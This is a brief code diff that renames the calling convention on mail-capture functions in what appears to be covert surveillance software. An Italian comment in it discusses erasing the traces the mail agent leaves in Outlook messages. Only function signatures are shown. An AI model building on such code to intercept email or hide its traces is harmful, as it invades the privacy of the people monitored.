@@ -51,7 +51,7 @@ DWORD WINAPI CaptureMailThread(DWORD dummy)
 }
 
 
-DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	DWORD dummy;
 
@@ -81,7 +81,7 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_MailCapInit(JSONObject elem)
+DWORD WINAPI PM_MailCapInit(JSONObject elem)
 {
 	JSONObject mail, filter;
 	WCHAR mail_tag[] = { 'm', 'a', 'i', 'l', 0 };
@@ -114,7 +114,7 @@ DWORD __stdcall PM_MailCapInit(JSONObject elem)
 	return 1;
 }
 
-DWORD __stdcall PM_MailCapUnregister()
+DWORD WINAPI PM_MailCapUnregister()
 {
 	// XXX Posso eliminare le tracce che lascia l'agente mail (es: le properties
 	// nelle mail di outlook). In questo caso posso esportare una funzione da 
